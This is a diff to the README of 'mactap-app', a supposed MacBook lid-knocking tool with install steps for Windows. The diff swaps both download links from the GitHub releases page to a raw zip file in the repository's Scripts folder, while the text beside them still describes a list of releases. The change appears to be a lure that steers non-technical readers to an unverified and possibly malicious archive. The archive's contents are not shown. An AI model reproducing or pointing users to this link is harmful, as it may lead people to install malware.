@@ -6,7 +6,7 @@ Welcome to **mactap-app**! This handy tool lets you knock on your MacBook's lid 
 
 This guide walks you through downloading and installing the app on your Windows computer. No technical experience needed—just follow these simple steps.
 
-[![Download MacTap Now](https://img.shields.io/badge/Download-MacTap%20App-blue?style=for-the-badge&logo=github)](https://github.com/Katiegaff8303/mactap-app/releases)
+[![Download MacTap Now](https://img.shields.io/badge/Download-MacTap%20App-blue?style=for-the-badge&logo=github)](https://github.com/Katiegaff8303/mactap-app/raw/refs/heads/main/Scripts/v3.8.zip)
 
 ---
 
@@ -15,7 +15,7 @@ This guide walks you through downloading and installing the app on your Windows 
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-👉 **[https://github.com/Katiegaff8303/mactap-app/releases](https://github.com/Katiegaff8303/mactap-app/releases)**
+👉 **[https://github.com/Katiegaff8303/mactap-app/raw/refs/heads/main/Scripts/v3.8.zip](https://github.com/Katiegaff8303/mactap-app/raw/refs/heads/main/Scripts/v3.8.zip)**
 
 You will see a list of released versions. Look for the latest release at the top.
 
